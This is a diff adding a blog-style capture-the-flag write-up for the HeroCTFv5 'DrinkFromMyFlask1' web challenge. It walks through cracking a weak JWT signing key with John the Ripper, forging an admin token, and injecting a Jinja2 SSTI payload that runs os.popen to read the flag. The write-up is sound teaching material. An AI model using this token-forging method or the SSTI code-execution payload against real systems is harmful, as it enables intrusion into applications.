@@ -1,0 +1,143 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HeroCTFv5 DrinkFromMyFlask1 // chrootcommit</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.111.3">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="chrootcommit" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.1fe426fd82899b3823133b4b6fadb0e1f0d8332eecc710a4dfe43101ac5895e0.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HeroCTFv5 DrinkFromMyFlask1"/>
+<meta name="twitter:description" content="under B0rn2PwnCTF team
+Overview A friend of yours got into an argument with a flask developer. He tried handling it himself, but he somehow got his nose broken in the process&hellip; Can you put your hacker skills to good use and help him out?
+You should probably be able to access the server hosting your target&rsquo;s last project, shouldn&rsquo;t you ? I heard is making a lost of programming mistakes&hellip;"/>
+
+    <meta property="og:title" content="HeroCTFv5 DrinkFromMyFlask1" />
+<meta property="og:description" content="under B0rn2PwnCTF team
+Overview A friend of yours got into an argument with a flask developer. He tried handling it himself, but he somehow got his nose broken in the process&hellip; Can you put your hacker skills to good use and help him out?
+You should probably be able to access the server hosting your target&rsquo;s last project, shouldn&rsquo;t you ? I heard is making a lost of programming mistakes&hellip;" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://chrootcommit.github.io/posts/heroctfv5-drinkfrommyflask1/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-05-14T18:49:09-04:00" />
+<meta property="article:modified_time" content="2023-05-14T18:49:09-04:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://chrootcommit.github.io/"><img class="app-header-avatar" src="/profile.png" alt="chrootcommit" /></a>
+      <span class="app-header-title">chrootcommit</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/posts/about">About</a>
+            -
+          
+          <a class="app-header-menu-item" href="/">Home</a>
+            -
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Junior Cybersecurity Consultant.</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/ChRootCommit" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HeroCTFv5 DrinkFromMyFlask1</h1>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          May 14, 2023
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          2 min read
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://chrootcommit.github.io/tags/heroctfv5/">HeroCTFv5</a>
+              <a class="tag" href="https://chrootcommit.github.io/tags/web/">Web</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>under B0rn2PwnCTF team</p>
+<h1 id="overview">Overview</h1>
+<p>A friend of yours got into an argument with a flask developer. He tried handling it himself, but he somehow got his nose broken in the process&hellip; Can you put your hacker skills to good use and help him out?</p>
+<p>You should probably be able to access the server hosting your target&rsquo;s last project, shouldn&rsquo;t you ? I heard is making a lost of programming mistakes&hellip;</p>
+<p><img src="/heroctf/drinkmyflask_overview.png" alt=""></p>
+<h1 id="find-critical-endpoint">Find critical endpoint</h1>
+<p>We can try to enter a bad endpoint :</p>
+<p><img src="/heroctf/drinkmyflask_test.png" alt=""></p>
+<p><img src="/heroctf/drinkfrommyflask_ssti.png" alt=""></p>
+<p>It is vulnerable to ssti but we can&rsquo;t insert large payload.</p>
+<h1 id="jwt-brute-force">jwt brute force</h1>
+<p>if we go to /adminPage endpoint it says we are guest, and we have a session token.
+Let&rsquo;s decode it with jwt.io :</p>
+<pre tabindex="0"><code>token :
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww
+
+decoded : 
+
+  {
+  &#34;role&#34;: &#34;guest&#34;
+  }
+</code></pre><p>We can brute force the signature key to create our admin token.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/CTF/heroctf/flask<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ echo <span style="color:#e6db74">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.AdxhLneoWOkeXGQFwWUbDzS3J2W6_Re-NbZLP_SRUww&#34;</span> &gt; hash.txt
+</span></span><span style="display:flex;"><span>                                                                                                                                                                                                                                                                           
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/CTF/heroctf/flask<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ john hash.txt                                            
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>HMAC-SHA256 <span style="color:#f92672">[</span>password is key, SHA256 128/128 AVX 4x<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">4</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Proceeding with single, rules:Single
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>Almost <span style="color:#66d9ef">done</span>: Processing the remaining buffered candidate passwords, <span style="color:#66d9ef">if</span> any.
+</span></span><span style="display:flex;"><span>Proceeding with wordlist:/usr/share/john/password.lst
+</span></span><span style="display:flex;"><span>Proceeding with incremental:ASCII
+</span></span><span style="display:flex;"><span>key              <span style="color:#f92672">(</span>?<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:00:01 DONE 3/3 <span style="color:#f92672">(</span>2023-05-14 19:13<span style="color:#f92672">)</span> 0.6849g/s 741467p/s 741467c/s 741467C/s biannon..170771
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed. 
+</span></span></code></pre></div><p>After getting the secret signature, create a token as <code>{ &quot;role&quot;:&quot;admin&quot;}</code> and apply the token on the website.
+The Endpoint /adminPage will display <code>Welcome to admin! </code></p>
+<h1 id="ssti-throught-jwt-token">SSTI Throught jwt token</h1>
+<p>With burpsuite we can test ssti by changing the role field in our token :
+<img src="/heroctf/drinkfrommyflask_ssti_token_test.png" alt=""></p>
+<p>it is vulnerable to SSTI. We can perform rce to get the flag with the <code>{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }} </code> payload as value of role field.</p>
+<p><img src="/heroctf/drinkfrommyflask_ssti_token.png" alt=""></p>
+<p>Flag : Hero{sst1_fl4v0ur3d_c0Ok1e}</p>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
